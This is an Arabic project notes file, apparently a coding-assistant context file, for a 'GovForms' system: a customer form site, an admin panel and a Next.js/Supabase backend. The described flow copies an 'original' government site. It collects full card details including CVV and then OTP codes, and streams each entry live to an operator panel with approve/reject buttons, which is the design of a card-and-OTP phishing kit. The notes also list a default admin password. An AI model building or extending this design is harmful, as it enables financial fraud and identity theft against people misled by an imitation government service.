# GovForms — ملاحظات المشروع

## نظرة عامة
نظام حكومي (نموذج GovForms) بنية منفصلة:
- **موقع العملاء**: HTML/CSS/JS خالص في `customer-site/` — تقديم نماذج
- **لوحة الإدارة**: HTML/CSS/JS خالص في `admin-panel/` — عربية RTL بهوية خضراء
- **الباك إند**: Next.js + TypeScript في `backend/` — APIs + Supabase + Socket.io

## البنية التقنية
- الباك إند: Next.js 14 (App Router) + TypeScript + Supabase + Socket.io
- قاعدة البيانات: Supabase (8 جداول، 21 فهارس، 7 سياسات RLS، 4 triggers، 3 دوال)
- المصادقة: JWT (secret في `.env`)
- الوقت الحي: Socket.io عبر `/api/socket`

## أوامر التشغيل
```bash
# الباك إند
cd backend && npm run dev   # يعمل على http://localhost:3000

# موقع العملاء (HTML ثابت)
cd customer-site && python3 -m http.server 8080

# لوحة الإدارة (HTML ثابت)
cd admin-panel && python3 -m http.server 8081
```

## مسارات الـ API
- `POST /api/auth/login` — تسجيل دخول المدير
- `GET /api/auth/verify` — التحقق من توكن المدير
- `POST /api/submit` — استقبال النماذج من العملاء (مع فحص الحظر)
- `POST /api/payment` — إدراج بيانات دفع مرتبطة بطلب (submissionId + clientId)
- `POST /api/otp` — إدراج رمز تحقق OTP مرتبط بطلب (code 4-8 أرقام)
- `POST /api/files` — رفع الملفات إلى Storage
- `POST /api/blocked-check` — فحص الحظر
- `GET /api/inbox` — صندوق الوارد (للمدير)
- `GET /api/client?client_id=` — تفاصيل العميل + الخط الزمني
- `POST /api/decision` — قرارات المدير (موافقة/رفض)
- `POST /api/block` — حظر/إلغاء حظر
- `POST /api/archive` — أرشفة
- `GET /api/stats` — الإحصائيات
- `/api/socket` — تهيئة Socket.io

## حساب المدير الافتراضي
- البريد: admin@govforms.local
- كلمة المرور: Admin@2024

## الهوية البصرية للوحة الإدارة (ثابتة)
- اللون الأساسي: أخضر #16a34a، تدرّج → #047857
- البطاقة المصوّرة: خلفية خضراء داكنة #004d26
- الشريط العلوي: 46px sticky
- الشريط الجانبي: 240px (220px على الهاتف يصبح 60px)
- صندوق الوارد: قائمة + لوحة تفاصيل (نمط تبديل على الهاتف)
- الخطوط: Cairo, Tajawal, monospace للأرقام

## ملفات مرجعية
- `govforms-site-analysis-ar-he.txt` — تحليل موقع GovForms الأصلي (الواجهة الأمامية)
- `لوحة الادارة مهارة اعادة استخدام.txt` — مواصفات لوحة الإدارة (الهوية الثابتة)

## Storage
- Bucket: `attachments` (private، حد 20MB)
- يُنشأ تلقائياً عند أول رفع (أو يدوياً عبر `ensureAttachmentsBucket()`)

## تدفّق العميل (صفحات منفصلة)
الموقع: `startScreen` → `formScreen` → `paymentScreen` → `otpScreen` → `successScreen`.
- بعد `/api/submit` يُرجع `submissionId` + `clientId` + `reference`، تُحفظ في `state.lastSubmission`.
- `paymentScreen`: حقول البطاقة (رقم/حامل/انتهاء/CVV/بنك/نوع/دولة) + بطاقة معاينة مصوّرة خضراء، POST `/api/payment`.
- `otpScreen`: 6 صناديق OTP مع auto-advance + paste، POST `/api/otp`.
- كل إدخال (payment/otp) يُبَث لحظياً للوحة الإدارة عبر `admin:new_entry` ويظهر كصندوق في الخط الزمني مع أزرار قرار.
